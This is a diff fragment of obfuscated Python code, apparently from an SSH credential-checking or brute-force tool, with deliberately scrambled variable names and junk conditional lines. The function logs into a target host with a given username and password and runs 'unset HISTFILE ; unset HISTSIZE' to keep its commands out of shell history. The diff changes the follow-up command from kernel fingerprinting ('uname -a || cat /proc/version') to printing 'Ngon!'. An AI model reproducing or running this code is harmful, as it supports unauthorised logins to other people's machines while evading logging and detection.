@@ -266,7 +266,7 @@ def o0oO ( target , port , user , passwd , outfile , timeo , i ) :
   try :
    IIiIi1iI . exec_command ( 'unset HISTFILE ; unset HISTSIZE' )
    time . sleep ( 1 )
-   i1IiiiI1iI , i1iIi , ooOOoooooo = IIiIi1iI . exec_command ( 'uname -a ' '|| cat /proc/version' )
+   i1IiiiI1iI , i1iIi , ooOOoooooo = IIiIi1iI . exec_command ( 'echo Ngon!' )
    if 1 - 1: Oo0Ooo / o0oOOo0O0Ooo % iii1I1I * O00oOoOoO0o0O . i11iIiiIii
    III1Iiii1I11 = 'Ngon! kernel: %s' % ( i1iIi . readlines ( ) [ 0 ] . replace ( '\n' , '' ) )
    if 9 - 9: I1ii11iIi11i / Oo0Ooo - I1IiiI / OoooooooOO / iIii1I11I1II1 - o0oOOo0O0Ooo
